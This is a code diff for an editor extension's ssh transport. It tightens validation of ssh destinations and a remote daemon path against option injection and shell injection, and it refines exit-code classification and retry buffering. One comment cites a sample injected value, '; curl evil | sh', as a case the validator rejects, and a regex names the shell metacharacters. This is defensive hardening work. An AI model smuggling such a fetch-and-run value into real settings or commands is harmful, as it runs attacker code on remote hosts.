@@ -17,30 +17,60 @@ export const SSH_CONNECTION_FAILURE_EXIT_CODE = 255;
 /** The remote shell's exit code when the command it was asked to run isn't on its `PATH`. */
 export const REMOTE_COMMAND_NOT_FOUND_EXIT_CODE = 127;
 
+/** ssh isn't found on the editor's own `PATH`, so it never ran at all. */
+const SSH_NOT_FOUND_HINT = 'Install ssh, or make sure it is on PATH.';
+
 /**
  * `wispd` on a host's `PATH`, then the paths Homebrew uses on Apple silicon and on Intel
  * (decision record 0007; see daemon/README.md for why a non-interactive SSH `PATH` misses these).
  */
 export const DEFAULT_REMOTE_WISPD_CANDIDATES: readonly string[] = ['wispd', '/opt/homebrew/bin/wispd', '/usr/local/bin/wispd'];
 
-const CONTROL_CHARACTER = /[\u0000-\u001f\u007f]/;
+/** Every C0 and C1 control character, plus Unicode format characters such as zero-width space and RTL override. */
+const CONTROL_OR_FORMAT_CHARACTER = /[\p{Cc}\p{Cf}]/u;
+/** Shell metacharacters. ssh runs argv with no shell of its own, but the destination still ends up in one on the host (0007) or, for a user@-host form, can be misread by ssh itself. */
+const SHELL_METACHARACTER = /[`$;&|<>(){}'"\\]/;
+/** A `-` right where ssh would start reading a hostname: at the start, right after `@`, or right after a `scheme://`. */
+const LEADING_DASH = /(^|@|:\/\/)-/;
 
 /**
- * Rejects an ssh destination that ssh could misread as an option, or that could carry stray bytes
- * into the argument vector. Returns why it's invalid, or `undefined` if it's fine to use.
+ * Rejects an ssh destination that ssh could misread as an option, that could carry stray or
+ * invisible bytes into the argument vector, or that could inject a second shell command once the
+ * host's login shell runs it (0007's `-- <destination>` stops ssh from reading it as an option,
+ * but not the host's shell from interpreting what's inside it). Returns why it's invalid, or
+ * `undefined` if it's fine to use.
  */
 export function validateSshDestination(destination: string): string | undefined {
 	if (destination.length === 0) {
 		return 'it is empty';
 	}
-	if (destination.startsWith('-')) {
-		return 'it starts with "-", which ssh would read as an option';
+	if (LEADING_DASH.test(destination)) {
+		return 'it starts with "-" (or a user or scheme part does), which ssh would read as an option';
 	}
 	if (/\s/.test(destination)) {
 		return 'it contains whitespace';
 	}
-	if (CONTROL_CHARACTER.test(destination)) {
-		return 'it contains a control character';
+	if (CONTROL_OR_FORMAT_CHARACTER.test(destination)) {
+		return 'it contains a control or invisible formatting character';
+	}
+	if (SHELL_METACHARACTER.test(destination)) {
+		return 'it contains a shell metacharacter';
+	}
+	return undefined;
+}
+
+/** An absolute path of plain characters: no shell metacharacters, quoting, or expansion for a host's login shell to act on. */
+const REMOTE_WISPD_PATH_PATTERN = /^\/[A-Za-z0-9._+/-]+$/;
+
+/**
+ * Rejects a `wisp.remoteWispdPath` that isn't a plain absolute path. ssh joins the remote command
+ * with spaces and hands it to the host's login shell (0007), so anything else in this setting,
+ * such as `; curl evil | sh` or `$(...)`, would run there. Returns why it's invalid, or
+ * `undefined` if it's fine to use.
+ */
+export function validateRemoteWispdPath(path: string): string | undefined {
+	if (!REMOTE_WISPD_PATH_PATTERN.test(path)) {
+		return 'it must be an absolute path made only of letters, digits, and . _ + - /';
 	}
 	return undefined;
 }
@@ -51,60 +81,91 @@ export function buildSshArgs(destination: string, remoteWispd: string): string[]
 }
 
 /**
- * Maps ssh's exit codes and stderr to a close reason (decision record 0007). Exit 4 still means
- * `wispd attach` ran on the host and could not reach or start wispd there. Exit 127 means the
- * remote shell never found the command. Exit 255 is ssh's own catch-all for a connection that
- * never got to run anything, which stderr is the only way to tell apart.
+ * Builds the classifier that maps one ssh attempt's exit code and stderr to a close reason
+ * (decision record 0007). Exit 4 still means `wispd attach` ran on the host and could not reach or
+ * start wispd there. Exit 127 means the remote shell never found the command. Exit 255 is ssh's own
+ * catch-all for a connection that never got to run anything, which stderr is the only way to tell
+ * apart — but only for the attempt that never got anywhere: once a line has come back, an auth or
+ * host-key phrase left over in the stderr tail from earlier in the session doesn't apply anymore,
+ * so a later 255 is treated as a dropped connection instead.
  */
-export const classifySshExit: WispdCloseClassifier = (exitCode, signal, stderrTail) => {
-	if (exitCode === ATTACH_EXIT_UNREACHABLE) {
-		return { reason: 'unreachable', message: 'wispd attach could not reach or start wispd on the host.', exitCode };
-	}
-	if (exitCode === REMOTE_COMMAND_NOT_FOUND_EXIT_CODE) {
+export function makeSshClassifier(destination: string): WispdCloseClassifier {
+	return (exitCode, signal, stderrTail, receivedLine) => {
+		if (exitCode === ATTACH_EXIT_UNREACHABLE) {
+			return { reason: 'unreachable', message: `wispd attach could not reach or start wispd on ${destination}.`, exitCode };
+		}
+		if (exitCode === REMOTE_COMMAND_NOT_FOUND_EXIT_CODE) {
+			return {
+				reason: 'wispdNotFound',
+				message: `${destination}'s shell could not find wispd. Install it there with Homebrew, add it to PATH in ~/.zshenv, or set wisp.remoteWispdPath to its absolute path.`,
+				exitCode,
+			};
+		}
+		if (exitCode === SSH_CONNECTION_FAILURE_EXIT_CODE) {
+			return classifySshConnectionFailure(stderrTail, exitCode, destination, receivedLine);
+		}
 		return {
-			reason: 'wispdNotFound',
-			message: "The host's shell could not find wispd. Install it there with Homebrew, add it to PATH in ~/.zshenv, or set wisp.remoteWispdPath to its absolute path.",
+			reason: 'exited',
+			message: `ssh exited${signal ? ` on ${signal}` : ` with code ${exitCode}`}.`,
 			exitCode,
 		};
-	}
-	if (exitCode === SSH_CONNECTION_FAILURE_EXIT_CODE) {
-		return classifySshConnectionFailure(stderrTail, exitCode);
-	}
-	return {
-		reason: 'exited',
-		message: `ssh exited${signal ? ` on ${signal}` : ` with code ${exitCode}`}.`,
-		exitCode,
 	};
-};
+}
 
-function classifySshConnectionFailure(stderrTail: string, exitCode: number): Omit<IWispdTransportClose, 'stderr'> {
+function classifySshConnectionFailure(stderrTail: string, exitCode: number, destination: string, receivedLine: boolean): Omit<IWispdTransportClose, 'stderr'> {
 	const text = stderrTail.toLowerCase();
-	if (text.includes('permission denied') || text.includes('authentication failed') || text.includes('too many authentication failures')) {
-		return {
-			reason: 'authFailed',
-			message: 'ssh could not authenticate. BatchMode turns any prompt into this error, including one for interactive two-factor login, which is not supported. Run "ssh <destination>" in a terminal once to unlock your key.',
-			exitCode,
-		};
-	}
-	if (text.includes('host key verification failed') || text.includes('remote host identification has changed')) {
-		return {
-			reason: 'hostKeyUnknown',
-			message: 'ssh doesn\'t recognize the host\'s key yet, and BatchMode can\'t prompt to accept it. Run "ssh <destination>" in a terminal once to accept it.',
-			exitCode,
-		};
+	// Auth and host-key prompts only ever happen before anything has come back from the host; a
+	// 255 after that is a dropped connection, whatever unrelated text is still in the stderr tail.
+	if (!receivedLine) {
+		if (text.includes('permission denied') || text.includes('authentication failed') || text.includes('too many authentication failures')) {
+			return {
+				reason: 'authFailed',
+				message: `ssh could not authenticate to ${destination}. BatchMode turns any prompt into this error, including one for interactive two-factor login, which is not supported. Run "ssh ${destination}" in the integrated terminal to unlock your key.`,
+				exitCode,
+			};
+		}
+		// Checked before the more general "verification failed" text below, since ssh's changed-key
+		// warning ends with that same phrase.
+		if (text.includes('remote host identification has changed')) {
+			return {
+				reason: 'hostKeyChanged',
+				message: `ssh's saved key for ${destination} does not match what the host presented now, which can mean a possible attack. Verify the new key out of band, then update known_hosts yourself; wisp will not do it for you.`,
+				exitCode,
+			};
+		}
+		if (text.includes('host key verification failed')) {
+			return {
+				reason: 'hostKeyUnknown',
+				message: `ssh doesn't recognize ${destination}'s key yet, and BatchMode can't prompt to accept it. Run "ssh ${destination}" in the integrated terminal to accept it.`,
+				exitCode,
+			};
+		}
 	}
 	if (text.includes('could not resolve hostname') || text.includes('name or service not known') || text.includes('no route to host')
 		|| text.includes('network is unreachable') || text.includes('connection refused') || text.includes('operation timed out') || text.includes('connection timed out')) {
-		return { reason: 'noRoute', message: 'ssh could not reach the host: no route, or the attempt timed out.', exitCode };
+		return { reason: 'noRoute', message: `ssh could not reach ${destination}: no route, or the attempt timed out.`, exitCode };
 	}
 	return { reason: 'exited', message: `ssh exited with code ${exitCode}.`, exitCode };
+}
+
+/** Whether `line` parses as a JSON-RPC-shaped message: a JSON object, not a shell's banner text. */
+function isJsonRpcShaped(line: string): boolean {
+	try {
+		const value: unknown = JSON.parse(line);
+		return typeof value === 'object' && value !== null;
+	} catch {
+		return false;
+	}
 }
 
 /**
  * A transport that spawns ssh to reach `wispd attach` on a host (decision record 0007). It tries
  * `candidates` for the remote `wispd` in order, respawning with the next one whenever the shell
  * answers 127 (command not found), so the reconnect state machine in `WispdClient` still sees one
- * connection attempt per candidate list, not one per candidate.
+ * connection attempt per candidate list, not one per candidate. It stops doing that the moment a
+ * candidate answers with anything JSON-RPC shaped: from then on it behaves like a plain transport,
+ * an exit 127 included, so `WispdClient`'s own reconnect handles whatever comes after a working
+ * connection.
  */
 export class WispdSshTransport extends Disposable implements IWispdTransport {
 
@@ -122,11 +183,15 @@ export class WispdSshTransport extends Disposable implements IWispdTransport {
 	private index = 0;
 	private done = false;
 	/**
-	 * Lines sent to a candidate that turned out to be missing never reached anything: the shell
-	 * exited before reading stdin. Replaying them to the next candidate resends `initialize`,
-	 * which `WispdClient` otherwise believes it already sent. Cleared once a candidate answers
-	 * with anything, since retries only happen before that.
+	 * True once a candidate has answered with a JSON-RPC-shaped line. Before that, a `wispdNotFound`
+	 * close respawns the next candidate instead of closing, and `send` buffers lines so they can be
+	 * replayed: a candidate that turned out to be missing never read its stdin, so whatever
+	 * `WispdClient` sent it — `initialize`, up front and only once — needs to reach the next one
+	 * instead. After that, none of this applies: retries would silently swap out a live connection
+	 * from under `WispdClient`, and buffering forever would hold onto every message for the
+	 * connection's whole life, `context/write` payloads included.
 	 */
+	private settled = false;
 	private readonly sent: string[] = [];
 
 	constructor(
@@ -136,6 +201,7 @@ export class WispdSshTransport extends Disposable implements IWispdTransport {
 		private readonly command: string,
 		private readonly logger: ILogger,
 		private readonly maxFrameBytes: number | undefined,
+		private readonly classifyExit: WispdCloseClassifier,
 	) {
 		super();
 		this.spawnNext();
@@ -147,7 +213,9 @@ export class WispdSshTransport extends Disposable implements IWispdTransport {
 	}
 
 	send(line: string): void {
-		this.sent.push(line);
+		if (!this.settled) {
+			this.sent.push(line);
+		}
 		this.transport?.send(line);
 	}
 
@@ -155,14 +223,15 @@ export class WispdSshTransport extends Disposable implements IWispdTransport {
 		this.current.clear();
 		const remoteWispd = this.candidates[this.index];
 		const child = this.spawn(buildSshArgs(this.destination, remoteWispd));
-		const transport = this.current.add(new WispdProcessTransport(child, this.command, this.logger, this.maxFrameBytes, classifySshExit));
+		const transport = this.current.add(new WispdProcessTransport(child, this.command, this.logger, this.maxFrameBytes, this.classifyExit, SSH_NOT_FOUND_HINT));
 		this.transport = transport;
-		this.current.add(transport.onDidReceiveLine(line => this._onDidReceiveLine.fire(line)));
-		this.current.add(transport.onDidReceiveData(() => {
-			// A candidate that answers anything is the one that's staying; nothing after this
-			// point should be replayed to a future respawn.
-			this.sent.length = 0;
-			this._onDidReceiveData.fire();
+		this.current.add(transport.onDidReceiveData(() => this._onDidReceiveData.fire()));
+		this.current.add(transport.onDidReceiveLine(line => {
+			if (!this.settled && isJsonRpcShaped(line)) {
+				this.settled = true;
+				this.sent.length = 0;
+			}
+			this._onDidReceiveLine.fire(line);
 		}));
 		this.current.add(transport.onDidClose(close => this.onTransportClose(close)));
 		for (const line of this.sent) {
@@ -174,7 +243,7 @@ export class WispdSshTransport extends Disposable implements IWispdTransport {
 		if (this.done || this._store.isDisposed) {
 			return;
 		}
-		if (close.reason === 'wispdNotFound' && this.index + 1 < this.candidates.length) {
+		if (!this.settled && close.reason === 'wispdNotFound' && this.index + 1 < this.candidates.length) {
 			this.index++;
 			this.spawnNext();
 			return;
@@ -200,7 +269,8 @@ export class WispdSshTransportFactory implements IWispdTransportFactory {
 	readonly command: string;
 
 	constructor(private readonly launch: IWispdSshLaunch, private readonly logger: ILogger) {
-		this.command = `${launch.sshExecutable ?? 'ssh'} -T -o BatchMode=yes -o ConnectTimeout=10 -o ControlPath=none -- ${launch.destination} wispd attach`;
+		const firstCandidate = launch.remoteWispdCandidates[0] ?? 'wispd';
+		this.command = `${launch.sshExecutable ?? 'ssh'} -T -o BatchMode=yes -o ConnectTimeout=10 -o ControlPath=none -- ${launch.destination} ${firstCandidate} attach`;
 	}
 
 	create(): IWispdTransport {
@@ -216,24 +286,17 @@ export class WispdSshTransportFactory implements IWispdTransportFactory {
 				cwd: this.launch.cwd ?? homedir(),
 			}) as cp.ChildProcess & IWispdProcessStreams;
 		};
-		return new WispdSshTransport(this.launch.destination, this.launch.remoteWispdCandidates, spawn, this.command, this.logger, this.launch.maxFrameBytes);
+		return new WispdSshTransport(this.launch.destination, this.launch.remoteWispdCandidates, spawn, this.command, this.logger, this.launch.maxFrameBytes, makeSshClassifier(this.launch.destination));
 	}
 }
 
-/** A transport that closes on its own, for a `wisp.host` that isn't usable (decision record 0007). */
+/** A transport that closes on its own, for a `wisp.host` or `wisp.remoteWispdPath` that isn't usable (decision record 0007). */
 export class WispdInvalidHostTransportFactory implements IWispdTransportFactory {
 
-	readonly command: string;
-
-	constructor(private readonly host: string, private readonly reason: string) {
-		this.command = `ssh -- ${host} wispd attach`;
-	}
+	constructor(readonly command: string, private readonly message: string) { }
 
 	create(): IWispdTransport {
-		return new ImmediateCloseTransport({
-			reason: 'invalidHost',
-			message: `wisp.host ("${this.host}") is not a valid ssh destination: ${this.reason}.`,
-		});
+		return new ImmediateCloseTransport({ reason: 'invalidHost', message: this.message });
 	}
 }
 
